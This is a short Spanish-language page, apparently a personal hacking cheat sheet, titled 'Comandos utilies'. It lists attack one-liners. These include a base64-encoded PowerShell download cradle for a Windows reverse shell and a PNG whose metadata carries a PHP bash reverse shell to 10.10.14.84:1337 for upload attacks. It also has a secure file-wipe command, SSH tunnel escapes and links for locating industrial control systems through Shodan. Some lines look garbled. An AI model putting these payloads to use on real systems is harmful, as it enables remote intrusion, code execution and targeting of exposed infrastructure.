---
title: 'Comandos utilies'
description: '... \u'
pubDate: 'May 12 2023'
slug: 'help/utils'
---

```bash
cat /proc/net/tcp
echo $((0x))

shred -zun 10 -v file.txt

seq 1 200 | xargs -P50 -I {} curl googl{} .com

##
->tecla enter
# virulilla + c
~C
#
-D 1080


### ver comandos
ps -eo user,command

### base64 para windows reverse shell
iex(New.Object Net.WebClient).downloadString("target_ip/ps.ps1") | iconv -t utf-16ble | base64 -w 0; echo

powershell -enc "base64"

# creamos un png y lo llamamos con php por ejemplo
convert xc:red -set 'Copyright' '<?php system("bash -i >& /dev/tcp/10.10.14.84/1337 0>&1"); ?>' payload.png
```

```bash
Sistemas de control industrial (scadan,pcl)

https://github.com/jakejarvis/awesome-shodan-queries?tab=readme-ov-file#industrial-control-systems
https://www.linkedin.com/pulse/ot-hunt-finding-icsot-zoomeye-sulaiman-alhasawi-ixvxf/

```
